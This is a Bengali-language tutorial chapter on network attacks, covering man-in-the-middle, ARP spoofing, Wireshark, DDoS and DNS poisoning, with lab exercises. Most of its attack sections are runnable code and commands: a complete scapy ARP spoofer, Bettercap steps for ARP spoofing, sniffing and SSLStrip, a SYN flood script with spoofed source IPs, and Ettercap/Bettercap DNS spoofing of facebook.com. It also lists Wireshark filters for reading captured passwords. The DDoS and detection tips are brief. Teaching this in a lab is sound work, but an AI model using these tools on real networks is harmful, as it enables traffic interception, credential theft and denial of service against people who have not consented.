# অধ্যায় ২০: Network Attacks

## সহজ কথায়:
Network attack = দুই computer-এর মধ্যকার কথোপকথন শোনা বা পরিবর্তন করা — যেমন তোমার বন্ধুর সাথে ফোনে কথা বলার সময় তৃতীয় কেউ লাইন ট্যাপ করলো।

---

## ২০.১ Man-in-the-Middle (MITM) Attack

MITM = Attacker নিজেকে দুই পক্ষের মাঝে insert করে — সব traffic attacker-এর মধ্য দিয়ে যায়।

### MITM Categorization:

```
তুমি → Internet → Website
           ↓
তুমি → Attacker → Internet → Website (MITM)
```

### কীভাবে MITM সম্ভব:
```
1. ARP Spoofing (local network)
2. DNS Spoofing
3. Rogue Access Point (WiFi)
4. Proxy manipulation
5. HTTPS downgrade (SSLStrip)
```

---

## ২০.২ ARP Spoofing (ARP Poisoning) — সম্পূর্ণ কোড

ARP Spoofing = Network-এ নিজেকে router বলে পরিচয় দেওয়া → সব traffic তোমার computer-এর মাধ্যমে যায়।

### Python ARP Spoofer:

```python
#!/usr/bin/env python3
# 🕵️ ARP Spoofing Tool — Educational Only
from scapy.all import *
import time
import sys

def get_mac(ip):
    """ARP request দিয়ে MAC address বের করো"""
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = broadcast / arp_request
    answered = srp(packet, timeout=2, verbose=0)[0]
    if answered:
        return answered[0][1].hwsrc
    return None

def arp_spoof(target_ip, spoof_ip):
    """Target-কে বলো আমি = spoof_ip"""
    target_mac = get_mac(target_ip)
    if not target_mac:
        print(f"[!] Could not find MAC for {target_ip}")
        return

    packet = ARP(
        op=2,                    # ARP reply (is-at)
        pdst=target_ip,          # Target IP
        hwdst=target_mac,        # Target MAC
        psrc=spoof_ip            # আমি এই IP (Router)
    )
    send(packet, verbose=0)

def restore_arp(target_ip, source_ip):
    """Original ARP table restore করো"""
    target_mac = get_mac(target_ip)
    source_mac = get_mac(source_ip)
    if not target_mac or not source_mac:
        return

    packet = ARP(
        op=2,
        pdst=target_ip,
        hwdst=target_mac,
        psrc=source_ip,
        hwsrc=source_mac
    )
    send(packet, count=4, verbose=0)

# Setup
target_ip = "192.168.1.10"     # Victim
gateway_ip = "192.168.1.1"     # Router
sent_packets = 0

print("🚀 ARP Spoofing started!")
print(f"Target: {target_ip}")
print(f"Gateway: {gateway_ip}")

try:
    while True:
        # Target কে বলি: router = আমার MAC
        arp_spoof(target_ip, gateway_ip)
        # Router কে বলি: target = আমার MAC
        arp_spoof(gateway_ip, target_ip)
        sent_packets += 2
        print(f"\r[+] Packets sent: {sent_packets}", end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[!] Restoring ARP tables...")
    restore_arp(target_ip, gateway_ip)
    restore_arp(gateway_ip, target_ip)
    print("[✓] Done!")
```

### Using Bettercap (আধুনিক tool):

```bash
# Bettercap install:
sudo apt install bettercap

# Start:
sudo bettercap

# ARP spoof:
set arp.spoof.targets 192.168.1.10
arp.spoof on

# HTTP traffic capture:
net.sniff on

# HTTPS downgrade:
set http.proxy.sslstrip true
http.proxy on

# See captured data:
# সব HTTP request/response দেখাবে
```

---

## ২০.৩ Wireshark Tutorial — Packet Capture, Filter, Analyze

Wireshark = Network traffic দেখার সবচেয়ে শক্তিশালী tool। সব packet capture + filter + analyze।

### Install:
```bash
# Kali:
sudo apt install wireshark

# Windows:
# https://wireshark.org/download.html
```

### First Capture:

```
1. Wireshark খোলো
2. Interface select করো (eth0 বা WiFi)
3. Start (blue fin button)
4. কিছু website Visite করো
5. Stop (red square)
```

### Essential Filters:

```bash
# Protocol filters:
http           # শুধু HTTP traffic
dns            # DNS queries
tcp            # TCP packets
udp            # UDP packets
arp            # ARP traffic
icmp           # Ping packets

# IP filters:
ip.addr == 192.168.1.10         # নির্দিষ্ট IP
ip.src == 192.168.1.10          # Source IP
ip.dst == 8.8.8.8               # Destination IP

# Port filters:
tcp.port == 80                  # HTTP port
tcp.port == 443                 # HTTPS port
udp.port == 53                  # DNS port

# Content filters:
http.request                    # HTTP requests only
http.response                   # HTTP responses
http.host == "google.com"       # Specific host
tcp contains "password"         # Packet with "password"
tcp contains "flag"             # CTF flags

# Combination:
http and ip.addr == 192.168.1.10
tcp.port == 80 and !arp

# Follow TCP stream:
Right-click → Follow → TCP Stream
# → পুরো conversation দেখাবে (HTTP login, etc.)
```

### Practical Wireshark Usage:

```
🎯 Case 1: See login credentials
Filter: http.request.method == POST
→ Follow TCP stream → দেখো username/password

🎯 Case 2: Detect ARP spoofing
Filter: arp.duplicate-address-detected
→ Duplicate MAC address খুঁজে বের করো

🎯 Case 3: DNS queries
Filter: dns
→ কোন website Visite করছে দেখো

🎯 Case 4: Suspicious traffic
Filter: tcp.port > 49152
→ High port connection (malware?)
```

### Wireshark Statistics:

```
Statistics → Protocol Hierarchy
→ কোন protocol কতটা traffic

Statistics → Conversations
→ কোন IP-র সাথে কতটা কথা

Statistics → HTTP → Requests
→ সব HTTP request list
```

---

## ২০.৪ DDoS Attack — কীভাবে হয়, Defense

DDoS = Distributed Denial of Service। অনেক computer একসাথে একটি server-এ request পাঠিয়ে **overload** করে দেয়।

### DDoS Attack Types:

```
Layer 7 (Application):
├── HTTP Flood — অসংখ্য HTTP request
├── Slowloris — ধীরে ধীরে connection খোলা
└── DNS Amplification — ছোট query → বড় response

Layer 3/4 (Network):
├── SYN Flood — Half-open TCP connection
├── UDP Flood — Random port-এ UDP packet
└── ICMP Flood (Ping of Death)
```

### Simple DDoS (Python — Educational):

```python
#!/usr/bin/env python3
# SYN Flood — Educational Purpose
from scapy.all import *
import random

target_ip = "192.168.1.10"
target_port = 80

def syn_flood():
    while True:
        # Random source IP
        src_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
        src_port = random.randint(1024, 65535)

        ip = IP(src=src_ip, dst=target_ip)
        tcp = TCP(sport=src_port, dport=target_port, flags="S")

        send(ip/tcp, verbose=0)
        print(f"🚀 SYN sent from {src_ip}:{src_port}", end="\r")

# Warning: চালাবে না!
# syn_flood()  # ⚠️ শুধু নিজের lab-এ
```

### DDoS Defense:

```
1. Rate Limiting — প্রতি IP থেকে limit request
2. Web Application Firewall (WAF) — Cloudflare, AWS WAF
3. Anycast Network — traffic distribute
4. DDoS Protection Service — Cloudflare, Akamai
5. SYN Cookie — prevent SYN flood
6. Blackhole Routing — traffic drop
7. Auto-scaling — more server spin up
```

### Cloudflare Protection:

```bash
# Cloudflare setup:
1. DNS → Cloudflare nameserver
2. Proxy status → Orange cloud (proxied)
3. Security → WAF rules
4. Under Attack mode → "I'm Under Attack"

# Test:
dig example.com
# Cloudflare IP দেখাবে, তোমার real server IP নয়
```

---

## ২০.৫ DNS Poisoning

DNS Poisoning = DNS cache corrupt করে → victim-কে fake website-এ নিয়ে যাওয়া।

### DNS Spoofing (Bettercap):

```bash
# Bettercap DNS spoof:
sudo bettercap

set arp.spoof.targets 192.168.1.10
set dns.spoof.domains facebook.com
set dns.spoof.address 192.168.1.5  # তোমার fake server
arp.spoof on
dns.spoof on
```

### Ettercap DNS Spoof:

```bash
# Edit ettercap dns file:
sudo nano /etc/ettercap/etter.dns

# Add:
facebook.com A 192.168.1.5
*.facebook.com A 192.168.1.5

# Start:
sudo ettercap -T -M arp -i eth0 /192.168.1.10// /192.168.1.1//
```

---

## 💡 ল্যাব এক্সারসাইজ

```
🔰 Metasploitable2 এবং Kali দিয়ে:

১. ARP Spoof (Kali থেকে):
   - Kali IP: 192.168.56.101
   - Metasploitable IP: 192.168.56.102
   - ARP spoof করো (ইতর tools দিয়ে)

২. Wireshark capture:
   - Metasploitable থেকে FTP login করো
   - Wireshark-এ ftp filter দাও
   - Login credential দেখো!

৩. MITM:
   - ARP spoof চালানোর পর Wireshark-এ traffic দেখো
   - কোন site Visite করছে দেখো
```

---

## 📌 মনে রাখো

| Attack | Protocol | Layer | Tool |
|--------|----------|-------|------|
| **ARP Spoof** | ARP | L2 | Bettercap, arpspoof |
| **DNS Spoof** | DNS | L7 | Bettercap, ettercap |
| **MITM** | Multiple | All | Bettercap |
| **DDoS** | Multiple | L3-L7 | Various |
| **Packet Capture** | All | All | Wireshark |

**পরবর্তী — WiFi Hacking! 📡**
